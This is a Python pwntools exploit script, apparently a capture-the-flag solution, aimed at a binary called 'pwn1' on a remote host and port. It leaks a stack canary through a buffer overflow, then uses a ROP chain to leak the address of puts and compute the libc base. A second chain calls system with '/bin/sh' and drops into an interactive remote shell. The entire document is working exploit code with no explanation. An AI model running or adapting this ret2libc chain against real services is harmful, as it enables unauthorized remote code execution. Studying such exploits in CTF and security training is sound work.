from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pwn1"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

# p = process(argv=[binary])
p = remote("220.249.52.133", 31459)

elf = ELF(binary)
libc = ELF(libc_binary)
context.arch = "amd64"

puts_plt = elf.sym["puts"]
puts_got = elf.got["puts"]
main_addr = 0x400908
pop_rdi = 0x400a93

def leak_canary():
    p.sendlineafter(">> ","1")
    p.sendline("a"*0x87+"b")
    p.sendlineafter(">> ","2")
    p.recvuntil("b"+"\n")
    canary = u64(p.recv(7).rjust(8,"\x00"))
    return canary

canary = leak_canary()
# gdb.attach(p)
log.success("canary is : " + hex(canary))

p.sendlineafter(">> ","1")
payload = flat([
    "a"*0x88,canary,"b"*8,pop_rdi,puts_got,puts_plt,main_addr
])
p.sendline(payload)
p.sendlineafter(">> ","3")
call_back = u64(p.recv(6).ljust(8,"\x00"))
log.success("puts address :" + hex(call_back))

libc_base = call_back - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
sh_addr = libc_base + 0x18cd57

p.sendlineafter(">> ","1")
payload = flat([
    "a"*0x88,canary,"b"*8,pop_rdi,sh_addr,system_addr,main_addr
])
p.sendline(payload)
p.sendlineafter(">> ","3")


p.interactive()
